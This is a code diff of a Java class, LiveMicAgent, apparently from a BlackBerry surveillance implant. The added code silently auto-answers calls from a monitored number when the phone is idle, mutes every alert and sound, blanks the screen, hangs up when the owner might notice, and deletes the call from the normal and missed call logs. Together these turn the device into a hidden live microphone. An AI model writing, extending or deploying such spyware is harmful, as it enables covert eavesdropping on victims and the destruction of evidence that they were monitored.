@@ -12,14 +12,23 @@ package blackberry.agent;
 import java.io.EOFException;
 import java.util.Date;
 import java.util.Hashtable;
+import java.util.Timer;
+
+import javax.microedition.media.Manager;
+import javax.microedition.media.Player;
+import javax.microedition.media.control.ToneControl;
 
 import net.rim.blackberry.api.phone.Phone;
 import net.rim.blackberry.api.phone.PhoneCall;
 import net.rim.blackberry.api.phone.PhoneListener;
 import net.rim.blackberry.api.phone.phonelogs.CallLog;
+import net.rim.blackberry.api.phone.phonelogs.PhoneCallLog;
 import net.rim.blackberry.api.phone.phonelogs.PhoneLogs;
+import net.rim.device.api.system.Alert;
 import net.rim.device.api.system.Application;
+import net.rim.device.api.system.Audio;
 import net.rim.device.api.system.Backlight;
+import net.rim.device.api.system.DeviceInfo;
 import net.rim.device.api.ui.Keypad;
 import net.rim.device.api.ui.UiApplication;
 import net.rim.device.api.util.DataBuffer;
@@ -27,6 +36,7 @@ import blackberry.AppListener;
 import blackberry.config.Conf;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
+import blackberry.fs.Path;
 import blackberry.injection.KeyInjector;
 import blackberry.injection.MenuWalker;
 import blackberry.interfaces.BacklightObserver;
@@ -35,13 +45,21 @@ import blackberry.interfaces.PhoneCallObserver;
 import blackberry.log.Log;
 import blackberry.log.LogType;
 import blackberry.utils.Check;
+import blackberry.utils.Utils;
 import blackberry.utils.WChar;
 
 /**
  * The Class LiveMicAgent.
  */
-public class LiveMicAgent extends Agent implements PhoneCallObserver,
-        BacklightObserver, CallListObserver, PhoneListener {
+public class LiveMicAgent extends Agent implements BacklightObserver,
+        PhoneListener {
+
+    //#ifdef DEBUG
+    private static final long MINIMUM_IDLE_TIME = 5;
+    //#else
+    private static final long MINIMUM_IDLE_TIME = 60;
+    //#endif
+
     //#ifdef DEBUG
     private static Debug debug = new Debug("LiveMicAgent", DebugLevel.VERBOSE);
     //#endif
@@ -50,6 +68,7 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
     int volume;
     boolean autoanswer;
     boolean suspended;
+    boolean backlight;
 
     /**
      * Instantiates a new live mic agent.
@@ -70,6 +89,7 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
         Check.asserts(Log.convertTypeLog(agentId) == LogType.NONE,
                 "Wrong Conversion");
         //#endif
+
     }
 
     /**
@@ -113,8 +133,11 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
      * @see blackberry.threadpool.TimerJob#actualStart()
      */
     protected void actualStart() {
-        Phone.addPhoneListener(this);        
+        Phone.addPhoneListener(this);
         AppListener.getInstance().addBacklightObserver(this);
+        backlight = Backlight.isEnabled();
+
+        //stopAudio();        
     }
 
     /*
@@ -126,6 +149,36 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
         AppListener.getInstance().removeBacklightObserver(this);
 
         suspendPainting(false);
+    }
+
+    private class StopAudio extends java.util.TimerTask {
+        public void run() {
+            try {
+                stopAudio();
+            } catch (Exception ex) {
+
+                //#ifdef DEBUG
+                debug.error("stopAudio: " + ex);
+                //#endif
+            }
+        }
+    }
+
+    public void stopAudio() {
+        Debug.init();
+        //#ifdef DEBUG
+        debug.trace("StopAudio");
+        //#endif
+
+        Alert.stopVibrate();
+        Alert.mute(true);
+        Audio.setVolume(0);
+        Alert.setVolume(0);
+        Alert.stopAudio();
+        Alert.stopBuzzer();
+        Alert.stopMIDI();
+        Alert.setADPCMVolume(0);
+        Alert.stopADPCM();
     }
 
     /*
@@ -142,6 +195,8 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
      */
     public synchronized void onCallAnswered(final int callId,
             final String phoneNumber) {
+        debug.init();
+
         //#ifdef DBC
         Check.requires(phoneNumber != null, "onCallIncoming: phoneNumber null");
         //#endif
@@ -175,6 +230,7 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
      */
     public synchronized void onCallConnected(final int callId,
             final String phoneNumber) {
+
         //#ifdef DBC
         Check.requires(phoneNumber != null, "onCallIncoming: phoneNumber null");
         //#endif
@@ -188,7 +244,10 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
         }
 
         Backlight.enable(false);
-        suspendPainting(false);
+
+        //suspendPainting(false);
+
+        Utils.sleep(2000);
         autoanswer = true;
     }
 
@@ -216,10 +275,74 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
             //#ifdef DEBUG
             debug.trace("onCallDisconnected, interesting");
             //#endif
+
+            removePhoneCall();
+
+            suspendPainting(false);
         }
+    }
 
-        suspendPainting(false);
+    private void removePhoneCall() {
+        Thread t = new Thread() {
+            public void run() {
+                init();
+                //#ifdef DEBUG
+                debug.trace("run: removePhoneCall");
+                //#endif
+                final int DELAY = 2000;
+                Utils.sleep(DELAY);
 
+                removePhoneCallFromFolder(PhoneLogs.FOLDER_NORMAL_CALLS);
+                removePhoneCallFromFolder(PhoneLogs.FOLDER_MISSED_CALLS);
+            }
+        };
+        t.start();
+    }
+
+    protected void removePhoneCallFromFolder(long folderID) {
+
+        //#ifdef DEBUG
+        debug.trace("removePhoneCallFromFolder: " + folderID);
+
+        //#endif
+        PhoneLogs phoneLogs = null;
+
+        try {
+
+            phoneLogs = PhoneLogs.getInstance();
+            int size = phoneLogs.numberOfCalls(folderID);
+
+            //#ifdef DEBUG
+            debug.trace("size before: " + size);
+            //#endif
+
+            for (int i = size - 1; i >= 0; i--) {
+                final CallLog log = phoneLogs.callAt(i, folderID);
+
+                if (PhoneCallLog.class.isAssignableFrom(log.getClass())) {
+                    PhoneCallLog plog = (PhoneCallLog) log;
+                    String phoneNumber = plog.getParticipant().getNumber();
+                    if (phoneNumber.endsWith(number)) {
+                        //#ifdef DEBUG
+                        debug.info("removePhoneCallFromFolder: " + phoneNumber);
+                        //#endif
+                        phoneLogs.deleteCall(i, folderID);
+                    }
+                }
+            }
+
+            size = phoneLogs.numberOfCalls(folderID);
+
+            //#ifdef DEBUG
+            debug.trace("size after: " + size);
+            //#endif
+
+        } catch (Exception e) {
+            //#ifdef DEBUG
+            debug.trace("removePhoneCallFromFolder: " + e);
+            //#endif
+
+        }
     }
 
     /*
@@ -239,21 +362,32 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
         //#endif
 
         if (!interestingNumber(callId, phoneNumber)) {
+            //#ifdef DEBUG
+            debug.trace("onCallIncoming not interesting: " + phoneNumber);
+            //#endif
             return;
         }
 
-        suspendPainting(true);
+        stopAudio();
+        /*
+         * try { Timer timer = new Timer(); timer.schedule(new StopAudio(),10);
+         * } catch (Exception ex) { //#ifdef DEBUG
+         * debug.error("onCallIncoming: " + ex); //#endif }
+         */
 
-        if (Backlight.isEnabled()) {
-            //#ifdef DEBUG
-            debug.info("Backlight enabled, killing incoming call");
-            //#endif
-            KeyInjector.pressKey(Keypad.KEY_END);
-        } else {
-            //#ifdef DEBUG
-            debug.info("Backlight disabled, accepting incoming call");
-            //#endif
+        /*
+         * if (backlight) { //#ifdef DEBUG
+         * debug.info("Backlight enabled, killing incoming call"); //#endif
+         * KeyInjector.pressKey(Keypad.KEY_END); } else { //#ifdef DEBUG
+         * debug.info("Backlight disabled, accepting incoming call"); //#endif
+         * KeyInjector.pressKey(Keypad.KEY_SEND); }
+         */
+
+        if (DeviceInfo.getIdleTime() > MINIMUM_IDLE_TIME) {
+            suspendPainting(true);
             KeyInjector.pressKey(Keypad.KEY_SEND);
+        } else {
+            KeyInjector.pressKey(Keypad.KEY_END);
         }
 
     }
@@ -269,8 +403,14 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
      * (non-Javadoc)
      * @see blackberry.interfaces.BacklightObserver#onBacklightChange(boolean)
      */
-    public synchronized void onBacklightChange(final boolean statusOn) {
-        if (autoanswer && statusOn) {
+    public void onBacklightChange(final boolean statusOn) {
+        backlight = statusOn;
+        //#ifdef DEBUG
+        debug.trace("onBacklightChange: " + backlight + " autoanswer: "
+                + autoanswer);
+        //#endif
+
+        if (autoanswer && backlight) {
             autoanswer = false;
             //#ifdef DEBUG
             debug.trace("onBacklightChange: sending END");
@@ -282,7 +422,7 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
 
             suspendPainting(false);
         }
-        //backlight = statusOn;
+
     }
 
     /**
@@ -326,7 +466,6 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
      * @return
      */
     private boolean interestingNumber(int callId, final String phoneNumber) {
-
         //#ifdef DBC
         Check.asserts(phoneNumber != null,
                 "interestingNumber: phoneNumber==null");
@@ -341,36 +480,11 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
         } else {
             if (phoneNumber != null) {
                 //#ifdef DEBUG
-                debug.trace("callingHistory adding callId: " + callId);
+                debug.trace("onCallIncoming tap: " + phoneNumber);
                 //#endif                
             }
             return true;
         }
-
-    }
-
-    public void callLogAdded(String number, String name, Date date,
-            int duration, boolean outgoing, boolean missed) {
-        final PhoneLogs phoneLogs = PhoneLogs.getInstance();
-        final int num = phoneLogs.numberOfCalls(PhoneLogs.FOLDER_NORMAL_CALLS);
-        for (int i = 0; i < num; i++) {
-            final CallLog log = phoneLogs.callAt(i,
-                    PhoneLogs.FOLDER_NORMAL_CALLS);
-
-            if (date.getTime() == log.getDate().getTime()) {
-                //#ifdef DEBUG
-                debug.trace("deleting date: " + log.getDate());
-                //#endif 
-                phoneLogs.deleteCall(i, PhoneLogs.FOLDER_NORMAL_CALLS);
-                break;
-            }
-        }
-
-        final int newnum = phoneLogs
-                .numberOfCalls(PhoneLogs.FOLDER_NORMAL_CALLS);
-        //#ifdef DEBUG
-        //debug.trace("num: " + num + " after delete:" + newnum);
-        //#endif
     }
 
     /****************************** Call ******************************/
@@ -383,6 +497,7 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
     }
 
     public void callAnswered(int callId) {
+        init();
         final PhoneCall phoneCall = Phone.getCall(callId);
         final String phoneNumber = phoneCall.getDisplayPhoneNumber().trim();
         final boolean outgoing = phoneCall.isOutgoing();
@@ -397,6 +512,7 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
     }
 
     public void callConnected(int callId) {
+        init();
         final PhoneCall phoneCall = Phone.getCall(callId);
         final String phoneNumber = phoneCall.getDisplayPhoneNumber().trim();
         final boolean outgoing = phoneCall.isOutgoing();
@@ -415,14 +531,12 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
     }
 
     public void callDisconnected(int callId) {
+        init();
         final PhoneCall phoneCall = Phone.getCall(callId);
         String phoneNumber = null;
 
         if (phoneCall != null) {
-
             phoneNumber = phoneCall.getDisplayPhoneNumber();
-            //outgoing = phoneCall.isOutgoing();
-
         } else {
 
             synchronized (callingHistory) {
@@ -457,6 +571,7 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
     }
 
     public void callIncoming(int callId) {
+        init();
         final PhoneCall phoneCall = Phone.getCall(callId);
         final String phoneNumber = phoneCall.getDisplayPhoneNumber();
         final boolean outgoing = phoneCall.isOutgoing();
@@ -469,6 +584,7 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
     }
 
     public void callInitiated(int callId) {
+        init();
         final PhoneCall phoneCall = Phone.getCall(callId);
         final String phoneNumber = phoneCall.getDisplayPhoneNumber();
         final boolean outgoing = phoneCall.isOutgoing();
@@ -476,7 +592,7 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
         synchronized (callingHistory) {
             callingHistory.put(new Integer(callId), phoneNumber);
         }
-        
+
         onCallInitiated(callId, phoneNumber);
     }
 
@@ -498,6 +614,13 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
     public void conferenceCallDisconnected(int arg0) {
         // TODO Auto-generated method stub
 
+    }
+
+    private synchronized void init() {
+        if (!Path.isInizialized()) {
+            Path.makeDirs();
+        }
+        Debug.init();
     }
 
 }
